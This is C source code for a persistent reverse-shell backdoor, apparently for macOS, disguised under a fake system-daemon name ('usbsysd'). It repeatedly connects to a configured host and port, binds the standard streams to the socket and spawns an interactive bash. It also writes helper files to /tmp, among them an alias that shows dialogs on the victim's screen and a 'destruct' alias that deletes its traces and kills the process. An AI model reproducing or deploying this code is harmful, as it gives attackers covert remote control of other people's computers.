#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>

#define SLEEPWAIT 1
#define PORT      "1024"
#define URL       "127.0.0.1"
#define COMMAND   "/bin/sh -i"
#define VERBOSE   0

#if VERBOSE == 1
#define SHOW(x) x
#else
#define SHOW(x) ;
#endif
#define ALIAS(name, cmd) "alias " #name "='" cmd "'\n"

int sockfd;
int stdinfd, stdoutfd, stderrfd;

const char *chat =
"on run argv\n"
"set question to argv as text\n"
"set answer to text returned of (display dialog question default answer \"\")\n"
"log answer\n"
"end run\n";

const char *setupsh =
ALIAS(chat, "osascript /tmp/chat.usbsysd")
ALIAS(destruct, "rm -rf /tmp/*.usbsysd ~/.config/Usbsysd; killall usbsysd; exit");

void startdup(void) {
    stdinfd = dup(STDIN_FILENO);
    stdoutfd = dup(STDOUT_FILENO);
    stderrfd = dup(STDERR_FILENO);
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);
}


void enddup(void) {
    printf("%d, %d\n", stdinfd, STDIN_FILENO);
    dup2(stdinfd, STDIN_FILENO);
    dup2(stdoutfd, STDOUT_FILENO);
    dup2(stderrfd, STDERR_FILENO);
    close(stdinfd);
    close(stdoutfd);
    close(stderrfd);
}


void flushwrite(const char *msg) {
    SHOW(
        puts(msg);
        fflush(stdout);
    )
}


void writefile(const char *path, const char *text) {
    FILE *fd = fopen(path, "w");
    fputs(text, fd);
    fflush(fd);
    fclose(fd);
}


int main(void) {
    struct addrinfo *info;
    int status;

    // Setup the setup script
    writefile("/tmp/shell.usbsysd", setupsh);
    writefile("/tmp/chat.usbsysd", chat);

    // Resolve address and get addrinfo struct
    getaddrinfo(URL, PORT, NULL, &info);

    for (;;) {
        // Create a new socket and connect to it
        flushwrite("Starting new connection..");
        sockfd = socket(PF_INET, SOCK_STREAM, 0);

        // Connect and excute the shell on success
        status = connect(sockfd, info->ai_addr, info->ai_addrlen);
        if (!status) {
            // Redirect standard streams and execute the shell
            startdup();
            system("bash --rcfile /tmp/shell.usbsysd -i");
            enddup();
        }

        // Close the socket and wait a bit
        flushwrite("Shuting down previous socket..");
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        sleep(SLEEPWAIT);
    }

    // Free addrinfo memory
    freeaddrinfo(info);
    return 0;
}
